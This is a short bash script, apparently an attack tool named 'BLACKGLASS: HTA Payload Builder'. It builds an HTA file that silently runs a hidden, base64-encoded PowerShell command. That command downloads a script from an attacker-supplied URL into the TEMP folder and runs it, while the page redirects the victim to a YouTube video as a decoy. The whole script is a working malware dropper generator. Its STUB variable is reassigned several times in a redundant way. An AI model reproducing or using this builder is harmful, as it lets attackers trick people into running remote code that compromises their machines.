#!/bin/bash
echo "[*] BLACKGLASS: HTA Payload Builder"
read -p "YouTube URL: " YT_URL
read -p "Payload URL (PS1): " PAYLOAD_URL
read -p "Output name (.hta): " HTA_NAME
export STUB="Invoke-WebRequest -Uri '$PAYLOAD_URL' -OutFile $env:TEMP\\x.ps1; Start-Process $env:TEMP\\x.ps1"

ENCODED=$(python3 -c "import base64, os; s = os.environ[\"STUB\"]; print(base64.b64encode(s.encode(\"utf-16le\")).decode())")
STUB="Invoke-WebRequest -Uri '$PAYLOAD_URL' -OutFile $env:TEMP\\x.ps1; Start-Process $env:TEMP\\x.ps1"

STUB="Invoke-WebRequest -Uri '' -OutFile $env:TEMP\\x.ps1; Start-Process $env:TEMP\\x.ps1"
STUB="Invoke-WebRequest -Uri '$PAYLOAD_URL' -OutFile \$env:TEMP\\x.ps1; Start-Process \$env:TEMP\\x.ps1"

cat > "output/$HTA_NAME" <<EOD
<html>
<head>
<script>
var shell = new ActiveXObject("WScript.Shell");
shell.Run("powershell -w hidden -enc $ENCODED", 0, false);
window.location = "$YT_URL";
</script>
</head>
<body>Loading video...</body>
</html>
EOD
echo "[+] HTA created: output/$HTA_NAME"
